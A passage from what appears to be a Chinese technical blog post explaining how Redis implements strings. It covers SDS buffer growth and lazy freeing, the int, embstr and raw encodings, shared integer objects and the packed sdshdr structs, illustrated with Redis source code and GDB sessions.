<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_MAX_PREALLOC (1024 * 1024)</span></span><br><span class="line">sds <span class="title function_">sdsMakeRoomFor</span><span class="params">(sds s, <span class="type">size_t</span> addlen)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> *<span class="title">sh</span>, *<span class="title">newsh</span>;</span></span><br><span class="line">    <span class="type">size_t</span> <span class="built_in">free</span> = sdsavail(s);</span><br><span class="line">    <span class="type">size_t</span> len, newlen;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">free</span> &gt;= addlen) <span class="keyword">return</span> s;			<span class="comment">// 如果剩余空间足够直接返回</span></span><br><span class="line">	len = sdslen(s);</span><br><span class="line">	sh = (<span class="type">void</span>*) (s-(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)));</span><br><span class="line">	newlen = (len+addlen);</span><br><span class="line">	<span class="keyword">if</span> (newlen &lt; SDS_MAX_PREALLOC)			<span class="comment">// 如修改后的SDS长度小于1M,realloc重新分配两倍空间</span></span><br><span class="line">   		newlen *= <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">    	newlen += SDS_MAX_PREALLOC;			<span class="comment">// 如修改后的SDS长度大于等于1M, realloc重新分配1M的空间</span></span><br><span class="line">	newsh = zrealloc(sh, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)+newlen+<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (newsh == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	newsh-&gt;<span class="built_in">free</span> = newlen - len;</span><br><span class="line">	<span class="keyword">return</span> newsh-&gt;buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，额外分配的未使用空间大小由修改后的SDS长度决定：</p>
<ul>
<li>如果对SDS修改后，SDS长度(即len属性的值)小于1MB，REDIS会额外分配len个字节的空间。例如，给定SDS串s(“hello”)，调用sdscat(s, “world”)之后，len &#x3D; 10，free &#x3D; 10, buf数组大小变为 10 + 10 + 1 &#x3D; 21字节。</li>
<li>如果对SDS修改后，SDS长度大于等于1MB， REDIS只额外分配1MB的空间，目的是避免内存出现太大的浪费。</li>
</ul>
<p>相比C风格字符串，<strong>SDS的扩容策略将增长N次字符串需要的内存重分配次数从N次降低为最多N次</strong>。</p>
<p>GDB验证结果如下，和分析源码得出的结论一致：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set key hello</span><br><span class="line">[OOK</span><br><span class="line">(gdb) p *(struct sdshdr *)((*(robj *)server.db[0].dict.ht[0].table[3].v).ptr - 0x8)</span><br><span class="line">$1 = &#123;len = 5, free = 0, buf = 0x7f571f1407f8 &quot;hello&quot;&#125;</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; APPEND key world</span><br><span class="line">(integer) 10</span><br><span class="line">(gdb) p *(struct sdshdr *)((*(robj *)server.db[0].dict.ht[0].table[3].v).ptr - 0x8)</span><br><span class="line">$2 = &#123;len = 10, free = 10, buf = 0x7f571f1407e8 &quot;helloworld&quot;&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="字符串缩短场景sds空间释放策略">字符串缩短场景，SDS空间释放策略<span id="jump8"></span></span></h4><p>对于字符串缩短场景，REDIS采用惰性空间释放策略，即并不立即回收空闲内存，而是仅使用free属性记录空闲字节数，如果将来需对SDS做增长操作，可以直接使用这部分空闲内存，无需做内存重分配。</p>
<p>源码分析：<code>sdsclear</code>用于清空SDS保存的字符串内容，采用惰性空闲释放策略，复杂度仅为O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sdsclear</span><span class="params">(sds s)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> *<span class="title">sh</span> =</span> (<span class="type">void</span>*) (s-(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)));</span><br><span class="line">    sh-&gt;<span class="built_in">free</span> += sh-&gt;len;</span><br><span class="line">    sh-&gt;len = <span class="number">0</span>;</span><br><span class="line">    sh-&gt;buf[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时，REDIS提供API <code>sdsRemoveFreeSpace</code>，通过realloc仅分配实际大小的内存，真正地回收空闲内存，解决惰性空间释放策略带来的内存浪费问题。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sds <span class="title function_">sdsRemoveFreeSpace</span><span class="params">(sds s)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> *<span class="title">sh</span>;</span></span><br><span class="line">    sh = (<span class="type">void</span>*) (s-(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)));</span><br><span class="line">    sh = zrealloc(sh, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)+sh-&gt;len+<span class="number">1</span>);	<span class="comment">// 仅分配实际大小的内存</span></span><br><span class="line">    sh-&gt;<span class="built_in">free</span> = <span class="number">0</span>;										<span class="comment">// free写0</span></span><br><span class="line">    <span class="keyword">return</span> sh-&gt;buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="sds最大长度是多少">SDS最大长度是多少？<span id="jump9"></span></span></h3><p>Redis 3.0</p>
<ul>
<li><p>struct sdshdr的len成员记录SDS长度，类型为int，4字节，理论上最大长度 2^32 &#x2F; 2^10 &#x2F; 2^10 &#x3D; 4096MB</p>
</li>
<li><p>在set, append操作中通过硬编码写死字符串的最大长度为512MB，超过这个长度会报错，源码参考<code>checkStringLength</code>。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">checkStringLength</span><span class="params">(redisClient *c, <span class="type">long</span> <span class="type">long</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">512</span>*<span class="number">1024</span>*<span class="number">1024</span>) &#123;</span><br><span class="line">        addReplyError(c,<span class="string">&quot;string exceeds maximum allowed size (512MB)&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> REDIS_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> REDIS_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>综上， Redis 3.0中SDS最大长度为 512MB。</p>
<p>Redis 6.0.10</p>
<ul>
<li>通过配置项<code>proto-max-bulk-len</code>指定SDS长度，默认是512MB，用户可以自行配置这个值，这点和Redis 3.0有区别。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">checkStringLength</span><span class="params">(client *c, <span class="type">long</span> <span class="type">long</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(c-&gt;flags &amp; CLIENT_MASTER) &amp;&amp; size &gt; server.proto_max_bulk_len) &#123;</span><br><span class="line">        addReplyError(c,<span class="string">&quot;string exceeds maximum allowed size (proto-max-bulk-len)&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> C_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> C_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>综上， Redis 6.0中SDS最大长度默认为512MB，用户可以自行配置这个值。</p>
<h3><span id="字符串键的三种编码方式">字符串键的三种编码方式<span id="jump10"></span></span></h3><p>Redis中字符串对象有三种编码，分别是int , embstr, raw。以下分别介绍这三种编码：</p>
<h4><span id="int编码">int编码<span id="jump11"></span></span></h4><p>如果一个字符串对象保存的内容是整数值，且这个整数可以用long表示，Redis就把它的编码设置为int</p>
<p>举例：执行 set key “123”命令，会创建一个int编码的字符串对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set key 123</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding key</span><br><span class="line">&quot;int&quot;</span><br></pre></td></tr></table></figure>

<p>内存中的<code>redisObject</code>对象内容如下：</p>
<p><img data-src="/2021/1211202806/image2.png"></p>
<p>int类型编码的字符串，要求整数落在long的范围内。在64位环境上，long范围：-9223372036854775808～+9223372036854775807，不同的键值和编码结果参考下表：</p>
<table>
<thead>
<tr>
<th align="left">键值</th>
<th align="left">编码</th>
</tr>
</thead>
<tbody><tr>
<td align="left">+123</td>
<td align="left">embstr</td>
</tr>
<tr>
<td align="left">-123</td>
<td align="left">int</td>
</tr>
<tr>
<td align="left">–123</td>
<td align="left">embstr</td>
</tr>
<tr>
<td align="left">-9223372036854775808</td>
<td align="left">int</td>
</tr>
<tr>
<td align="left">-9223372036854775809</td>
<td align="left">embstr</td>
</tr>
<tr>
<td align="left">9223372036854775807</td>
<td align="left">int</td>
</tr>
<tr>
<td align="left">9223372036854775808</td>
<td align="left">embstr</td>
</tr>
</tbody></table>
<p><strong>源码分析：</strong></p>
<p><code>createStringObjectFromLongLong</code>根据传入的long long类型的整数值，创建一个字符串对象。如果入参在long范围之内，就创建int编码的字符串对象，源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REDIS_SHARED_INTEGERS 10000</span></span><br><span class="line">robj *<span class="title function_">createStringObjectFromLongLong</span><span class="params">(<span class="type">long</span> <span class="type">long</span> value)</span> &#123;</span><br><span class="line">    robj *o;</span><br><span class="line">    <span class="comment">// value 的大小在 0 - 10000之间，直接返回一个共享对象</span></span><br><span class="line">    <span class="keyword">if</span> (value &gt;= <span class="number">0</span> &amp;&amp; value &lt; REDIS_SHARED_INTEGERS) &#123;</span><br><span class="line">        incrRefCount(shared.integers[value]);</span><br><span class="line">        o = shared.integers[value];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// 如果在long范围内，就创建编码为int的字符串</span></span><br><span class="line">        <span class="keyword">if</span> (value &gt;= LONG_MIN &amp;&amp; value &lt;= LONG_MAX) &#123;</span><br><span class="line">            o = createObject(REDIS_STRING, <span class="literal">NULL</span>);</span><br><span class="line">            o-&gt;encoding = REDIS_ENCODING_INT;</span><br><span class="line">            o-&gt;ptr = (<span class="type">void</span>*)((<span class="type">long</span>)value);	<span class="comment">// ptr实际指向一个long类型的value</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果在long之外，就创建一个编码为embstr的字符串</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            o = createObject(REDIS_STRING,sdsfromlonglong(value));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="redis中的对象共享机制">REDIS中的对象共享机制</span></h4><p>Redis服务器初始化的时候，会预先创建1万个字符串对象 (0 ~ 9999), 当服务器需要使用值为 0 - 9999的字符串对象时，服务器会直接使用这些共享对象，而不是去新创建一个对象。这个用意在于节约内存。</p>
<p><strong>举例：</strong></p>
<p>创建字符串键A，B，值都写“1”, 那么这两个键共享同一个redisObject对象，且这个redisObject对象的ptr指向的内容为1</p>
<p><strong>GDB验证结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb)  p *(robj *)server.db[0].dict.ht[0].table[0].v</span><br><span class="line">$15 = &#123;type = 0, encoding = 1, lru = 11668863, refcount = 3, ptr = 0x1&#125;</span><br><span class="line">(gdb)  p *(robj *)server.db[0].dict.ht[0].table[2].v</span><br><span class="line">$16 = &#123;type = 0, encoding = 1, lru = 11668863, refcount = 3, ptr = 0x1&#125;</span><br><span class="line">(gdb)  p &amp;(*(robj *)server.db[0].dict.ht[0].table[0].v)</span><br><span class="line">$17 = (robj *) 0x7fa7c1457360</span><br><span class="line">(gdb)  p &amp;(*(robj *)server.db[0].dict.ht[0].table[2].v)</span><br><span class="line">$18 = (robj *) 0x7fa7c1457360		# 和$17相同，都是0x7fa7c1457360，说明这是一个共享对象</span><br></pre></td></tr></table></figure>

<p>此时，两个key和共享字符串对象的内存示意图：</p>
<p><img data-src="/2021/1211202806/image3.png"></p>
<h4><span id="raw编码">raw编码<span id="jump13"></span></span></h4><p>如果字符串对象保存的是一个字符串值，且这个字符串长度大于39个字节，REDIS就使用SDS存储这个字符串，并设置编码类型为raw。</p>
<p><strong>举例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set key 1234567891234567891234567891234567891234</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding ket</span><br><span class="line">&quot;raw&quot;</span><br><span class="line">127.0.0.1:6379&gt; strlen key</span><br><span class="line">(integer) 40</span><br></pre></td></tr></table></figure>

<p>raw编码的字符串示意图：</p>
<p><img data-src="/2021/1211202806/image4.png"></p>
<p><strong>源码分析：</strong></p>
<p><code>createStringObject</code>用于创建一个SDS表示的字符串对象。当字符串长度大于39字节时使用raw编码， 否则用embstr编码，源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The current limit of 39 is chosen so that the biggest string object</span></span><br><span class="line"><span class="comment"> * we allocate as EMBSTR will still fit into the 64 byte arena of jemalloc. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REDIS_ENCODING_EMBSTR_SIZE_LIMIT 39</span></span><br><span class="line">robj *<span class="title function_">createStringObject</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= REDIS_ENCODING_EMBSTR_SIZE_LIMIT)</span><br><span class="line">        <span class="keyword">return</span> createEmbeddedStringObject(ptr,len);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> createRawStringObject(ptr,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">robj *<span class="title function_">createRawStringObject</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> createObject(REDIS_STRING,sdsnewlen(ptr,len));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">robj *<span class="title function_">createObject</span><span class="params">(<span class="type">int</span> type, <span class="type">void</span> *ptr)</span> &#123;</span><br><span class="line">    robj *o = zmalloc(<span class="keyword">sizeof</span>(*o));</span><br><span class="line">    o-&gt;type = type;</span><br><span class="line">    o-&gt;encoding = REDIS_ENCODING_RAW;	<span class="comment">// 设置编码类型为raw</span></span><br><span class="line">    o-&gt;ptr = ptr;</span><br><span class="line">    o-&gt;refcount = <span class="number">1</span>;</span><br><span class="line">    o-&gt;lru = LRU_CLOCK();</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4><span id="embstr编码">embstr编码<span id="jump12"></span></span></h4><p>如果字符串对象保存的是一个字符串值，且这个字符串长度小于等于39个字节，REDIS就使用SDS存储这个字符串，并设置编码类型为embstr，<strong>embstr是专门用于保存短字符串的一种优化编码方式。</strong></p>
<p><strong>举例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set key hello</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding key</span><br><span class="line">&quot;embstr&quot;</span><br></pre></td></tr></table></figure>

<p>和raw编码类似，embstr编码也使用<code>redisObject</code>和<code>sdshdr</code>保存字符串，但差别在于：</p>
<ul>
<li>raw编码需调用<strong>2</strong>次malloc创建<code>redisObject</code>和<code>sdshdr</code>对象，且<code>redisObject</code>和<code>sdshdr</code>内存不连续</li>
<li>而embstr编码只需<strong>1</strong>次malloc创建<code>redisObject</code>和<code>sdshdr</code>对象，且<code>redisObject</code>和<code>sdshdr</code>内存是连续的</li>
</ul>
<p>GDB查看embstr编码字符串的内存：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) p &amp;(*(robj *)server.db[0].dict.ht[0].table[3].v)</span><br><span class="line">$1 = (robj *) 0x7f43ebd3b9c0</span><br><span class="line">(gdb) p *(robj *)server.db[0].dict.ht[0].table[3].v</span><br><span class="line">$2 = &#123;type = 0, encoding = 8, lru = 11755503, refcount = 1, ptr = 0x7f43ebd3b9d8&#125;</span><br><span class="line">(gdb) p *(struct sdshdr *)0x7f43ebd3b9d0</span><br><span class="line">$3 = &#123;len = 5, free = 0, buf = 0x7f43ebd3b9d8 &quot;hello&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>观察结果发现robj和sdshdr内存确实是连续的，embstr编码的内存示意图：</p>
<p><img data-src="/2021/1211202806/image5.png"></p>
<p><strong>源码分析：</strong></p>
<p><code>createEmbeddedStringObject</code>用于创建一个embstr编码的字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">robj *<span class="title function_">createEmbeddedStringObject</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    robj *o = zmalloc(<span class="keyword">sizeof</span>(robj)+<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)+len+<span class="number">1</span>); <span class="comment">// 仅1次malloc</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> *<span class="title">sh</span> =</span> (<span class="type">void</span>*)(o+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    o-&gt;type = REDIS_STRING;</span><br><span class="line">    o-&gt;encoding = REDIS_ENCODING_EMBSTR;</span><br><span class="line">    o-&gt;ptr = sh+<span class="number">1</span>;</span><br><span class="line">    o-&gt;refcount = <span class="number">1</span>;</span><br><span class="line">    o-&gt;lru = LRU_CLOCK();</span><br><span class="line"></span><br><span class="line">    sh-&gt;len = len;</span><br><span class="line">    sh-&gt;<span class="built_in">free</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(sh-&gt;buf,ptr,len);</span><br><span class="line">        sh-&gt;buf[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">memset</span>(sh-&gt;buf,<span class="number">0</span>,len+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4><span id="设计embstr编码的用意是什么">设计embstr编码的用意是什么<span id="jump14"></span></span></h4><p>相比于raw编码，embstr编码存储短字符串的优点：</p>
<ul>
<li><p>创建字符串对象时，malloc次数从2次变为1次，释放字符串对象时，free次数从2次变成1次。</p>
</li>
<li><p>embstr编码中，<code>redisObject</code>和<code>sdshdr</code>内存连续，可以更好利用缓存，提升效率。</p>
</li>
</ul>
<h4><span id="三种编码之间的转换规则">三种编码之间的转换规则<span id="jump15"></span></span></h4><p><strong>规则1：</strong> embstr对象执行修改命令后，总是会变成一个raw编码对象。</p>
<p><strong>规则2：</strong> 对于int对象，如果在这个对象执行的操作导致其保存的值不在long范围内，这个对象编码总是变成raw</p>
<p><strong>源码分析：</strong></p>
<p>以APPEND命令为例，源码参考<code>appendCommand</code>，此函数最终调用<code>dbUnshareStringValue</code>，总是创建一个raw编码的对象。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">appendCommand</span><span class="params">(redisClient *c)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> totlen;</span><br><span class="line">    robj *o, *append;</span><br><span class="line">    o = lookupKeyWrite(c-&gt;db,c-&gt;argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 键值对不存在就创建一个新的 ......</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 键值对存在 ......</span></span><br><span class="line">        <span class="comment">/* &quot;append&quot; is an argument, so always an sds */</span></span><br><span class="line">        append = c-&gt;argv[<span class="number">2</span>];</span><br><span class="line">        totlen = stringObjectLen(o)+sdslen(append-&gt;ptr);</span><br><span class="line">        <span class="keyword">if</span> (checkStringLength(c,totlen) != REDIS_OK)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">/* Append the value */</span></span><br><span class="line">        o = dbUnshareStringValue(c-&gt;db,c-&gt;argv[<span class="number">1</span>],o);</span><br><span class="line">        o-&gt;ptr = sdscatlen(o-&gt;ptr,append-&gt;ptr,sdslen(append-&gt;ptr));</span><br><span class="line">        totlen = sdslen(o-&gt;ptr);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// ......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">robj *<span class="title function_">dbUnshareStringValue</span><span class="params">(redisDb *db, robj *key, robj *o)</span> &#123;</span><br><span class="line">    redisAssert(o-&gt;type == REDIS_STRING);</span><br><span class="line">    <span class="keyword">if</span> (o-&gt;refcount != <span class="number">1</span> || o-&gt;encoding != REDIS_ENCODING_RAW) &#123;</span><br><span class="line">        robj *decoded = getDecodedObject(o);</span><br><span class="line">        o = createRawStringObject(decoded-&gt;ptr, sdslen(decoded-&gt;ptr)); <span class="comment">// embstr对象执行修改命令后，总是会变成一个raw编码对象。</span></span><br><span class="line">        decrRefCount(decoded);</span><br><span class="line">        dbOverwrite(db,key,o);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>验证结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set key &quot;hello&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding key</span><br><span class="line">&quot;embstr&quot;</span><br><span class="line">127.0.0.1:6379&gt; append key &quot; world!&quot;</span><br><span class="line">(integer) 12</span><br><span class="line">127.0.0.1:6379&gt; object encoding key</span><br><span class="line">&quot;raw&quot;</span><br></pre></td></tr></table></figure>



<h4><span id="redis32中的sds实现">REDIS3.2中的SDS实现<span id="jump16"></span></span></h4><p>REDIS 3.2中，根据SDS的长度又细分为5类，对于不同长度的字符串，用不同的sdshdrX结构体存储，实现节约内存的目的。</p>
<p>以REDIS 6.0.10源码为例，sdshdr结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> *sds;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Note: sdshdr5 is never used, we just access the flags byte directly.</span></span><br><span class="line"><span class="comment"> * However is here to document the layout of type 5 SDS strings. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr5</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flags; <span class="comment">/* 3 lsb of type, and 5 msb of string length */</span></span><br><span class="line">    <span class="type">char</span> buf[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr8</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> len; <span class="comment">/* used */</span></span><br><span class="line">    <span class="type">uint8_t</span> alloc; <span class="comment">/* excluding the header and null terminator */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flags; <span class="comment">/* 3 lsb of type, 5 unused bits */</span></span><br><span class="line">    <span class="type">char</span> buf[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr16</span> &#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> len; <span class="comment">/* used */</span></span><br><span class="line">    <span class="type">uint16_t</span> alloc; <span class="comment">/* excluding the he</span></span><br><span class="line"><span class="comment">    ader and null terminator */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flags; <span class="comment">/* 3 lsb of type, 5 unused bits */</span></span><br><span class="line">    <span class="type">char</span> buf[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr32</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> len; <span class="comment">/* used */</span></span><br><span class="line">    <span class="type">uint32_t</span> alloc; <span class="comment">/* excluding the header and null terminator */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flags; <span class="comment">/* 3 lsb of type, 5 unused bits */</span></span><br><span class="line">    <span class="type">char</span> buf[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr64</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> len; <span class="comment">/* used */</span></span><br><span class="line">    <span class="type">uint64_t</span> alloc; <span class="comment">/* excluding the header and null terminator */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flags; <span class="comment">/* 3 lsb of type, 5 unused bits */</span></span><br><span class="line">    <span class="type">char</span> buf[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>各结构体成员作用：</strong></p>
<ul>
<li><p>len表示字符串实际长度。</p>
</li>
<li><p>alloc表示为sds分配的大小，不包括’\0’。</p>
</li>
<li><p>flags表示sdshdr类型，用于判断sds的类型。flags本身是char类型有8位，其中高5位保留，只用低3位足以这表示5种sdshdr类型，参考源码：</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_5  0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_8  1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_16 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_32 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_64 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_MASK 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_BITS 3</span></span><br></pre></td></tr></table></figure>

<p><strong><code>__attribute__ ((__packed__))</code>作用？</strong></p>
<p><code>__attribute__ ((__packed__))</code>是GCC特有的语法，作用是取消结构体的字节对齐，采用内存紧凑模式排列。</p>
<p>这里给出加上或不加关键字时，各sdshdr结构体的大小：</p>
<table>
<thead>
<tr>
<th align="left">结构体</th>
<th align="left">加GCC关键字<code>__attribute__ ((__packed__))</code></th>
<th align="left">不加关键字</th>
</tr>
</thead>
<tbody><tr>
<td align="left">sdshdr5</td>
<td align="left">1字节</td>
<td align="left">1</td>
</tr>
<tr>
<td align="left">sdshdr8</td>
<td align="left">3</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">sdshdr16</td>
<td align="left">5</td>
<td align="left">6</td>
</tr>
<tr>
<td align="left">sdshdr32</td>
<td align="left">9</td>
<td align="left">12</td>
</tr>
<tr>
<td align="left">sdshdr64</td>
<td align="left">17</td>
<td align="left">24</td>
</tr>
</tbody></table>
<p><strong>问题思考</strong>：取消结构体字节对齐的用意是什么，有什么优点？</p>
<ul>
<li>1个好处是节约了内存，时间换空间。</li>
<li>另1个好处是使得<strong>通过内存直接访问结构体内部变量非常方便</strong>，比如通过buf[-1]这种骚操作可以直接访问到<code>flags</code>成员，从而判断sds类型，实现非常简洁。源码参考如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sds s;</span><br><span class="line"><span class="type">char</span> type = s[<span class="number">-1</span>] &amp; SDS_TYPE_MASK;</span><br></pre></td></tr></table></figure>

<h4><span id="给定一个长度为n的sds它的底层通过哪个sdshdr类型表示">给定一个长度为n的sds，它的底层通过哪个sdshdr类型表示？<span id="jump17"></span></span></h4><p>以REDIS 6.0.10源码为例，参考<code>sdsReqType</code>的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">char</span> <span class="title function_">sdsReqType</span><span class="params">(<span class="type">size_t</span> string_size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">32</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_5;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_8;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">0xffff</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_16;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">0xffffffff</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_32;</span><br><span class="line">    <span class="keyword">return</span> SDS_TYPE_64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得出如下结论：</p>
<ul>
<li>SDS长度小于32，用sdshdr5类型表示</li>
<li>SDS长度在 [32, 255），用sdshdr8类型表示</li>
<li>依次类推 ……</li>
</ul>
<p><strong>思考问题：</strong><code>set key hello</code>， 键key和值hello都是用sdshdr5表示的吗？</p>
